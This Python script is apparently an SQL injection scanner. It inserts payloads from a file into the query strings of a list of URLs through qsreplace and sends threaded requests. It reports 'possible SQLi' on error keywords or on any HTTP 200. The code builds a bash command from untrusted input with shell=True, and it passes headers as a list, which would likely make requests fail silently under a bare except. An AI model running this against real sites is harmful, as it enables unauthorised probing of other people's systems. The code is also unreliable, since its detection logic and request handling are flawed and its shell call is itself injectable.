#!/usr/bin/python3

import requests
import re
import http
import sys
from subprocess import check_output
import urllib
import threading


http.client.HTTPConnection.debuglevel = 0 #nao derrubar o seu ip para muitas requisicoes
headers = ['User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ']


def applyPayload(url, payload):
    payScape = payload.strip().replace("'", "dede").replace('"', "dezao")
    cmd = f"echo '{url.strip()}'| qsreplace '{payScape}'"
    modUrl = check_output(cmd, shell=True, executable='/bin/bash')
    payScape = urllib.parse.unquote(modUrl.decode().strip())
    payScape = payScape.replace("dede", "'").replace('dezao', '"')
    return payScape

def sqliErrorBased(req, payScape):
        s1 = re.search('erro', req.text, re.IGNORECASE)
        s2 = re.search('sql', req.text, re.IGNORECASE)
        s3 = re.search('syntax', req.text, re.IGNORECASE)
        if (s1 or s2 or s3):
            print(f"Found possible SQLi Error Based at {payScape}")
            
def sqliBooleanBased(req, payScape):
    if (int(req.status_code) == 200):
        print(f"Found possible SQLi Boolean Based at {payScape}")

def sqli(url, payload):
    try:
        s = requests.Session()
        payScape = applyPayload(url, payload)
        req = s.get(payScape, verify=True, headers=headers)
        sqliErrorBased(req, payScape)
        sqliBooleanBased(req, payScape)
    except:
        pass

def initSearch(url, sqliErrorBooleanPayload):
    threads = []
    with open(sqliErrorBooleanPayload, 'r') as payloadFile: 
        for payload in payloadFile:
            t = threading.Thread(target=sqli, args=(url, payload,))
            threads.append(t)
            t.start()
        for thread in threads:
            thread.join()

        
def urls(archive, sqliErrorBooleanPayload):                
    with open(archive, 'r') as urlsFile:
        for url in urlsFile:
            initSearch(url, sqliErrorBooleanPayload)
                
def main():
    archive, sqliErrorBooleanPayload = sys.argv[1:]
    urls(archive, sqliErrorBooleanPayload)
    
    
main()
